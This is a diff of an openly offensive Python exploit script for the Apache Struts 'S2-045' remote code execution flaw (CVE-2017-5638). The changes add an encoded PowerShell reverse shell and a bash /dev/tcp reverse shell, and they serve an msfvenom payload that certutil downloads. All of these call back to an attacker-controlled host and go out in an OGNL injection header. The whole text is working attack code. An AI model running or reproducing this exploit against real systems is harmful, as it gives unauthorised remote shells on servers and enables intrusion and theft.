@@ -1,7 +1,7 @@
 # Author (m4ud)
 # Apache Struts-045
 # CVE : 2017-5638
-
+from base64 import b64encode
 import sys
 import requests
 from optparse import OptionParser
@@ -27,29 +27,39 @@ class AS045:
 		self.lport = options.lport
 		self.lhost = options.lhost
 		self.wport = options.wport
-
+		self.shell = options.shell
 
 		if(len(sys.argv) < 3):
 			print('\n python3 exploit.py -h   ...for help')
 			print('\n Usage : exploit.py RHOST RPORT Struts-directory cmd')
 
 		else:
-			def wshell(shell):
-				f = open( 'shelb', 'w' )
-				f.write(shell)
-				f.close()
-				print("\r\n[+] Initiating Omega Protocol [+]")
+			def pwrsh():
+				print("\r\n[+] (m4ud) AS-045 RCE [+]")
+				print("\r\n[*] Deploying PowerShell [*]\r\n")
+				payload = "$client = New-Object System.Net.Sockets.TCPClient('" + self.lhost + "'," + str(self.lport) + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS(m4ud) ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+				payload = b64encode(payload.encode('UTF-16LE')).decode()
+				return payload
+
+
+			def bsh():
+				payload = "bash -i >&/dev/tcp/%s/%s 0>&1" % (self.lhost, str(self.lport))
+				return payload
 
 			def venom(shell, ext):
 				os.system("msfvenom -p "+ shell + "/shell_reverse_tcp LHOST=" + self.lhost+ " LPORT="+ str(self.lport) + " -f "+ ext+ " > shelb")
 
-			print("\r\n[+] (m4ud) AS-045 RCE [+]\r\n")
-			print("[+] Serving Payload at port " + str(self.wport) +" [+]\r\n")
-			server_address = (self.lhost, int(self.wport))
-			self.httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
-			self.server_thread = threading.Thread(target=self.httpd.serve_forever).start()
+
+#			if self.wport is not None:
+			def srv():
+				print("\r\n[+] (m4ud) AS-045 RCE [+]\r\n")
+				print("[+] Serving Payload at port " + str(self.wport) +" [+]\r\n")
+				server_address = (self.lhost, int(self.wport))
+				self.httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
+				self.server_thread = threading.Thread(target=self.httpd.serve_forever).start()
 
 			def stop(self):
+				time.sleep(4)
 				print("\r\n[+] Shutting Server down! [+]\r\n")
 				self.httpd.shutdown()
 				self.httpd.server_close()
@@ -64,17 +74,24 @@ class AS045:
 			if self.osys == "1":
 				shell = "windows"
 				ext = "exe"
-				venom(shell, ext)
-				os.system('mv shelb shelb.exe')
-				cmd = "certutil -urlcache -f -split http://%s:%s/shelb.exe & shelb.exe" % (self.lhost, self.wport)
+
+				if self.shell == "1":
+					cmd = pwrsh()
+				elif self.shell == "2":
+					venom(shell, ext)
+					srv()
+					os.system('mv shelb shelb.exe')
+					cmd = "certutil -urlcache -f -split http://%s:%s/shelb.exe;.\shelb.exe" % (self.lhost, self.wport)
+					cmd = b64encode(cmd.encode('UTF-16LE')).decode()
 
 			if self.osys == "2":
 				shell = "linux"
 				ext = "elf"
 				venom(shell, ext)
 				cmd = "curl http://%s/shelb |bash"
+				cmd = bsh()
 
-			URL = target + ':' + port + '/' + directory + '/'
+			URL = target + ':' + str(self.rport) + '/' + directory + '/'
 
 			payload = "%{(#_='multipart/form-data')."
 			payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
@@ -87,7 +104,7 @@ class AS045:
 			payload += "(#context.setMemberAccess(#dm))))."
 			payload += "(#cmd='%s')." % cmd
 			payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
-			payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+			payload += "(#cmds=(#iswin?{'powershell.exe','-nop','-e',#cmd}:{'/bin/bash','-c',#cmd}))."
 			payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
 			payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
 			payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
@@ -104,7 +121,7 @@ class AS045:
 
 def main():
 	parser = OptionParser()
-	parser.add_option("-p", "--port", dest="rport", help="RPORT, ")
+	parser.add_option("-p", "--port", dest="rport", default=8080, help="RPORT, ")
 	parser.add_option("-t", "--target", dest="target", help="Vulnerable Target, ")
 	parser.add_option("-d", "--dir", dest="directory",default='struts2-rest-showcase', help="Struts Application directory, ")
 	parser.add_option("-c", "--command", dest="command", help="System Command, ")
@@ -112,6 +129,7 @@ def main():
 	parser.add_option("-l", "--lhost", dest="lhost", help="LHOST")
 	parser.add_option("-P", "--lport", dest="lport",default=443 ,help="LPORT")
 	parser.add_option("-w", "--wport", dest="wport", default=4443, help="WPORT")
+	parser.add_option("-s", "--shell", dest="shell", help="Shell type: 1 = powershell or bash, and 2 = msfvenom")
 	(options, args) = parser.parse_args() 
 	exploit = AS045(options) 
 
